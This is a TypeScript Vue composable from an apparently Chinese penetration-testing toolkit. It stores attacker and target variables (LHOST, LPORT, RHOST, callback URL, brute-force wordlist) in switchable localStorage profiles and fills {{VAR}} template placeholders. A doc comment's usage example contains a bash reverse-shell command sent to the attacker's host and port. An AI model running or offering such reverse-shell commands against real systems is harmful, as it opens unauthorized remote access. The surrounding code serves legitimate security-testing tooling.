/**
 * 全局变量系统
 *
 * 预定义安全测试常用变量（LHOST、LPORT、RHOST 等），所有工具可共享使用。
 * 支持多配置方案（Profile）切换，适配不同目标环境。
 * 模板文本中使用 {{VAR_NAME}} 占位符，调用 replaceVars() 即可自动替换。
 *
 * 数据持久化到 localStorage，key 为 sectool_global_vars。
 */
import { reactive, watch } from "vue"
import { cloneDeep } from "lodash"

// ======================== 类型定义 ========================

/** 预定义变量的元信息 */
export interface GlobalVarDefinition {
    /** 变量名，如 LHOST */
    key: string
    /** 中文显示名 */
    label: string
    /** 英文显示名 */
    labelEn: string
    /** 中文说明 */
    description: string
    /** 英文说明 */
    descriptionEn: string
    /** 默认值 */
    defaultValue: string
    /** 输入框占位提示 */
    placeholder: string
}

/** 一套变量配置方案 */
export interface GlobalVarProfile {
    /** 唯一标识 */
    id: string
    /** 方案名称 */
    name: string
    /** 变量键值对 */
    vars: Record<string, string>
}

/** localStorage 持久化的数据结构 */
interface GlobalVarsState {
    /** 当前激活的配置方案 ID */
    currentProfileId: string
    /** 所有配置方案 */
    profiles: GlobalVarProfile[]
}

// ======================== 预定义变量 ========================

export const predefinedVars: GlobalVarDefinition[] = [
    {
        key: "LHOST",
        label: "本机IP",
        labelEn: "Local Host",
        description: "攻击机IP地址",
        descriptionEn: "Attacker IP",
        defaultValue: "",
        placeholder: "10.10.14.1",
    },
    {
        key: "LPORT",
        label: "本机端口",
        labelEn: "Local Port",
        description: "攻击机监听端口",
        descriptionEn: "Attacker listening port",
        defaultValue: "4444",
        placeholder: "4444",
    },
    {
        key: "RHOST",
        label: "目标IP",
        labelEn: "Remote Host",
        description: "目标主机IP地址",
        descriptionEn: "Target IP",
        defaultValue: "",
        placeholder: "10.10.10.1",
    },
    {
        key: "RPORT",
        label: "目标端口",
        labelEn: "Remote Port",
        description: "目标服务端口",
        descriptionEn: "Target port",
        defaultValue: "80",
        placeholder: "80",
    },
    {
        key: "TARGET",
        label: "目标域名",
        labelEn: "Target Domain",
        description: "目标域名或URL",
        descriptionEn: "Target domain or URL",
        defaultValue: "",
        placeholder: "example.com",
    },
    {
        key: "DOMAIN",
        label: "域名",
        labelEn: "Domain",
        description: "Active Directory 域名",
        descriptionEn: "AD domain name",
        defaultValue: "",
        placeholder: "corp.local",
    },
    {
        key: "USERNAME",
        label: "用户名",
        labelEn: "Username",
        description: "认证用户名",
        descriptionEn: "Auth username",
        defaultValue: "",
        placeholder: "admin",
    },
    {
        key: "PASSWORD",
        label: "密码",
        labelEn: "Password",
        description: "认证密码",
        descriptionEn: "Auth password",
        defaultValue: "",
        placeholder: "P@ssw0rd",
    },
    {
        key: "WORDLIST",
        label: "字典路径",
        labelEn: "Wordlist Path",
        description: "暴力破解字典文件路径",
        descriptionEn: "Bruteforce wordlist path",
        defaultValue: "/usr/share/wordlists/rockyou.txt",
        placeholder: "/usr/share/wordlists/rockyou.txt",
    },
    {
        key: "ATTACKER_URL",
        label: "攻击者服务器",
        labelEn: "Attacker Server",
        description: "用于接收回调的服务器URL",
        descriptionEn: "Callback server URL",
        defaultValue: "",
        placeholder: "http://10.10.14.1:8000",
    },
]

// ======================== 常量 ========================

const STORAGE_KEY = "sectool_global_vars"
const DEFAULT_PROFILE_NAME = "Default"

// ======================== 工具函数 ========================

/** 生成简短唯一 ID（不依赖外部库，Profile 数量有限够用） */
const generateId = (): string => {
    return Date.now().toString(36) + Math.random().toString(36).substring(2, 8)
}

/** 根据预定义变量的默认值创建初始变量映射 */
const buildDefaultVars = (): Record<string, string> => {
    const vars: Record<string, string> = {}
    for (const def of predefinedVars) {
        vars[def.key] = def.defaultValue
    }
    return vars
}

/** 创建一个新的配置方案 */
const createDefaultProfile = (name: string): GlobalVarProfile => ({
    id: generateId(),
    name,
    vars: buildDefaultVars(),
})

/** 从 localStorage 加载持久化数据，校验完整性 */
const loadState = (): GlobalVarsState => {
    try {
        const raw = localStorage.getItem(STORAGE_KEY)
        if (!raw) return createInitialState()

        const parsed = JSON.parse(raw) as GlobalVarsState
        if (
            !parsed ||
            !Array.isArray(parsed.profiles) ||
            parsed.profiles.length === 0 ||
            typeof parsed.currentProfileId !== "string"
        ) {
            return createInitialState()
        }

        // 确保每个 Profile 都包含所有预定义变量（版本升级时可能新增变量）
        for (const profile of parsed.profiles) {
            for (const def of predefinedVars) {
                if (!(def.key in profile.vars)) {
                    profile.vars[def.key] = def.defaultValue
                }
            }
        }

        // 确保 currentProfileId 指向存在的 Profile
        if (!parsed.profiles.some(p => p.id === parsed.currentProfileId)) {
            parsed.currentProfileId = parsed.profiles[0].id
        }

        return parsed
    } catch {
        return createInitialState()
    }
}

/** 初始状态：一个名为 Default 的默认配置方案 */
const createInitialState = (): GlobalVarsState => {
    const defaultProfile = createDefaultProfile(DEFAULT_PROFILE_NAME)
    return {
        currentProfileId: defaultProfile.id,
        profiles: [defaultProfile],
    }
}

/** 持久化到 localStorage */
const saveState = (state: GlobalVarsState): void => {
    try {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(state))
    } catch (e) {
        console.error("[GlobalVars] 保存失败:", e)
    }
}

// ======================== 单例状态（响应式） ========================

/** 全局唯一的响应式状态，所有 useGlobalVars() 共享同一份引用 */
let _state: GlobalVarsState | null = null
let _watchInitialized = false

const getState = (): GlobalVarsState => {
    if (!_state) {
        _state = reactive(loadState()) as GlobalVarsState
    }
    return _state
}

/** 初始化自动持久化 watch（仅执行一次） */
const initWatch = () => {
    if (_watchInitialized) return
    _watchInitialized = true

    const state = getState()
    watch(
        () => cloneDeep(state),
        () => saveState(state),
        { deep: true },
    )
}

// ======================== Composable ========================

/**
 * 全局变量 composable
 *
 * 返回响应式的变量数据和操作方法，多处调用共享同一份状态。
 *
 * @example
 * ```ts
 * const { vars, getVar, setVar, replaceVars } = useGlobalVars()
 * const lhost = getVar("LHOST")
 * const rendered = replaceVars("bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1")
 * ```
 */
export const useGlobalVars = () => {
    const state = getState()
    initWatch()

    /** 获取当前激活的配置方案 */
    const currentProfile = (): GlobalVarProfile => {
        const found = state.profiles.find(p => p.id === state.currentProfileId)
        // 兜底：如果找不到（数据异常），返回第一个
        return found || state.profiles[0]
    }

    /** 当前方案的变量映射（响应式） */
    const vars = new Proxy({} as Record<string, string>, {
        get(_target, prop: string) {
            return currentProfile().vars[prop] ?? ""
        },
        set(_target, prop: string, value: string) {
            currentProfile().vars[prop] = value
            return true
        },
        ownKeys() {
            return Object.keys(currentProfile().vars)
        },
        has(_target, prop: string) {
            return prop in currentProfile().vars
        },
        getOwnPropertyDescriptor(_target, prop: string) {
            if (prop in currentProfile().vars) {
                return { configurable: true, enumerable: true, writable: true, value: currentProfile().vars[prop] }
            }
            return undefined
        },
    })

    /** 设置变量值 */
    const setVar = (key: string, value: string): void => {
        currentProfile().vars[key] = value
    }

    /** 获取变量值，不存在则返回空字符串 */
    const getVar = (key: string): string => {
        return currentProfile().vars[key] ?? ""
    }

    /** 切换当前激活的配置方案 */
    const switchProfile = (id: string): void => {
        if (state.profiles.some(p => p.id === id)) {
            state.currentProfileId = id
        }
    }

    /** 创建新的配置方案，返回新方案 ID */
    const createProfile = (name: string): string => {
        const profile = createDefaultProfile(name || `Profile ${state.profiles.length + 1}`)
        state.profiles.push(profile)
        state.currentProfileId = profile.id
        return profile.id
    }

    /** 删除配置方案（不能删除最后一个） */
    const deleteProfile = (id: string): boolean => {
        if (state.profiles.length <= 1) return false
        const idx = state.profiles.findIndex(p => p.id === id)
        if (idx === -1) return false

        state.profiles.splice(idx, 1)
        // 如果删除的是当前方案，切到第一个
        if (state.currentProfileId === id) {
            state.currentProfileId = state.profiles[0].id
        }
        return true
    }

    /** 重命名配置方案 */
    const renameProfile = (id: string, name: string): boolean => {
        const profile = state.profiles.find(p => p.id === id)
        if (!profile) return false
        profile.name = name
        return true
    }

    /**
     * 替换文本中所有 {{VAR_NAME}} 占位符为对应变量值
     * 未设置的变量保留原始占位符（方便用户识别需要填写的内容）
     */
    const replaceVars = (text: string): string => {
        if (!text) return text
        return text.replace(/\{\{(\w+)\}\}/g, (_match, key: string) => {
            const value = getVar(key)
            return value !== "" ? value : `{{${key}}}`
        })
    }

    /**
     * 添加自定义变量（非预定义的）
     * 添加到当前方案中
     */
    const addCustomVar = (key: string, value: string = ""): void => {
        if (!key || key.trim() === "") return
        currentProfile().vars[key.trim().toUpperCase()] = value
    }

    /** 删除自定义变量（预定义变量只清空值，不删除键） */
    const removeCustomVar = (key: string): boolean => {
        const isPredefined = predefinedVars.some(d => d.key === key)
        if (isPredefined) return false
        delete currentProfile().vars[key]
        return true
    }

    /** 获取当前方案中的自定义变量列表（排除预定义的） */
    const getCustomVars = (): Array<{ key: string; value: string }> => {
        const predefinedKeys = new Set(predefinedVars.map(d => d.key))
        const profileVars = currentProfile().vars
        return Object.entries(profileVars)
            .filter(([k]) => !predefinedKeys.has(k))
            .map(([key, value]) => ({ key, value }))
    }

    /** 清空当前方案所有变量值（恢复默认） */
    const clearAll = (): void => {
        const profile = currentProfile()
        // 预定义变量恢复默认值
        for (const def of predefinedVars) {
            profile.vars[def.key] = def.defaultValue
        }
        // 删除自定义变量
        const predefinedKeys = new Set(predefinedVars.map(d => d.key))
        for (const key of Object.keys(profile.vars)) {
            if (!predefinedKeys.has(key)) {
                delete profile.vars[key]
            }
        }
    }

    /** 导出所有配置方案为 JSON 字符串（用于备份/分享） */
    const exportProfiles = (): string => {
        return JSON.stringify({
            currentProfileId: state.currentProfileId,
            profiles: state.profiles,
        }, null, 2)
    }

    /** 从 JSON 字符串导入配置方案（合并或替换） */
    const importProfiles = (json: string, replace: boolean = false): boolean => {
        try {
            const data = JSON.parse(json) as GlobalVarsState
            if (!data || !Array.isArray(data.profiles) || data.profiles.length === 0) {
                return false
            }
            // 校验每个 Profile 的基本结构
            for (const profile of data.profiles) {
                if (!profile.id || !profile.name || typeof profile.vars !== "object") {
                    return false
                }
            }

            if (replace) {
                // 替换模式：清空后导入
                state.profiles.splice(0, state.profiles.length, ...data.profiles)
                state.currentProfileId = data.currentProfileId || data.profiles[0].id
            } else {
                // 合并模式：追加新方案（重新生成 ID 避免冲突）
                for (const profile of data.profiles) {
                    const newProfile: GlobalVarProfile = {
                        id: generateId(),
                        name: profile.name,
                        vars: { ...profile.vars },
                    }
                    state.profiles.push(newProfile)
                }
            }
            return true
        } catch {
            return false
        }
    }

    return {
        /** 当前方案的变量（响应式代理） */
        vars,
        /** 所有配置方案（响应式数组） */
        profiles: state.profiles,
        /** 当前激活方案 ID（需要通过 state 读取以保持响应式） */
        get currentProfileId() { return state.currentProfileId },
        set currentProfileId(id: string) { switchProfile(id) },

        setVar,
        getVar,
        switchProfile,
        createProfile,
        deleteProfile,
        renameProfile,
        replaceVars,
        addCustomVar,
        removeCustomVar,
        getCustomVars,
        clearAll,
        exportProfiles,
        importProfiles,
        predefinedVars,
    }
}

export default useGlobalVars
